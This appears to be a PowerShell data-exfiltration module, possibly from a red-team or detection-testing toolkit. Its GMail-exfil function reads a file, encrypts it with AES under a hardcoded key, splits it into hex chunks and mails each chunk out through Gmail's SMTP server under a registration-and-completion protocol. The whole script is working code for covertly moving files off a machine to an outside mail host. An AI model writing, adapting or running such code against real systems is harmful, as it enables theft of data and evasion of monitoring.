function GMail-exfil
{
    param ([string] $file)
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $hash = $hash -replace '-','';
    $filename = Split-Path $file -leaf
    $bytes = AES $bytes
    $string = [System.BitConverter]::ToString($bytes);
    $string = $string -replace '-','';
    $len = $string.Length;
    #$split = Get-Random -minimum 1 -maximum 250;
    $split = 3000
    $id = 0
    $repeat=[Math]::Ceiling($len/$split);
    $remainder=$len%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
    $q = Send-GMail $data
    for($i=0; $i-lt($repeat-1); $i++){
        $str = $string.Substring($i * $Split, $Split);
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-GMail $data
    };
    if($remainder){
        $str = $string.Substring($len-$remainder);
        $i = $i +1
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-GMail $data
    };
    
    $i = $i + 1
    $data = $jobid + '|!|' + $i + '|!|DONE'
    $q = Send-GMail $data
};

function Send-GMail {
    param ([string] $data)
    $data = Base64 $data;   
    $From = ""
    $To = ""
    $SMTPServer = "smtp.gmail.com"
    $SMTPPort = "587"
    $Username = ""
    $Password = ''
    $subject = "det:toolkit"
    $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
    $smtp.EnableSSL = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.Send($Username, $Username, $subject, $data);
};

function Base64 {
    param ([string] $data)
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    return [Convert]::ToBase64String($Bytes)    
}

function AES {
    param ([byte[]] $data)

    $key = "THISISACRAZYKEY"
    $sha256 = New-Object System.Security.Cryptography.SHA256Managed

    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
    $AES.Padding = "PKCS7"
    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))

    $IV = new-object "System.Byte[]" 16
    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $RNGCrypto.GetBytes($IV)
    $AES.IV = $IV

    $Encryptor = $AES.CreateEncryptor()

    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
};

function Convert-ToCHexString 
{
    param ([String] $str) 
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
}